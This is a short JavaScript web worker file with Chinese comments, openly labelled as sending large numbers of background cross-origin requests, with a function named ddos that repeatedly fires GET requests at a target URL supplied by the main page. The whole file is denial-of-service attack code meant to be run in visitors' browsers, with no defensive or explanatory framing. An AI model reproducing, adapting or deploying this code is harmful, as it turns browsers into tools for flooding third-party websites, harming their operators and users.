//worker.js 后台发送大量跨域请求(CORS)
function makeGetRequest(target_url){
	var request=new XMLHttpRequest();        
      if(request)               
      {               
            request.open("GET",target_url,true);               
            request.onreadystatechange=function()               
            {               
                /*  if(request.readyState==4)               
                  {               
                       //           
                  }       
                  */        
           };               
              request.send(null);                        
        }               
       else
       {               
            //alert('Sorry,your browser doesn\'t support SMLHttpRequest');  //这里不支持alert方法
        }               
}
function ddos(ddos_target){
  var i=0;
	for(i=0;i<=4;i++){
		makeGetRequest(ddos_target);
		postMessage( "ddos----"+ddos_target );
	}
	makeGetRequest(ddos_target);
		postMessage( "ddos----"+ddos_target );
	postMessage( "ddos finished" ); //将执行结束的信息发送回主线程
}
self.onmessage =function (evt){
  var d = evt.data;//通过evt.data获得发送来的数据
  ddos(d);
}